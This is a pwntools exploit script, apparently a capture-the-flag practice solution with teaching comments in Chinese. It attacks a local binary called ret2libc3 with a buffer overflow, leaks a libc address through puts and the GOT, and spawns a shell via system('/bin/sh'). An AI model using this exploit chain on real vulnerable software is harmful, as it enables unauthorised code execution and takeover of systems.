from pwn import *
from LibcSearcher import LibcSearcher

p = process("./ret2libc3")
elf = ELF('./ret2libc3')

puts_plt = elf.plt['puts']   # puts 函数的 PLT 地址
_start_addr = elf.symbols['_start']  # _start 是程序的入口函数地址
libc_printf_got = elf.got['printf']  # printf 函数的 GOT 地址

print("[+]泄露printf()函数地址，并返回程序_start()函数重新执行程序")
payload = flat([b'A' * 112, puts_plt, _start_addr, libc_printf_got])
p.sendlineafter(b'Can you find it !?', payload)
#libc_printf_got的地址会被puts()泄露(打印)出来，recv()接收下即可

print("[+]获取system()函数及字符串/bin/sh的真实地址")
libc_printf_addr = u32(p.recv()[0:4])  # 读取puts打印的地址
#print(hex(libc_printf_addr))
libc = LibcSearcher('printf', libc_printf_addr)    # 用LibcSearcher匹配 libc 库版本
libcbase = libc_printf_addr - libc.dump('printf')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("[+]获取系统Shell")
payload = flat([b'A' * 112, system_addr, b'AAAA', binsh_addr])
p.sendline(payload)

p.interactive()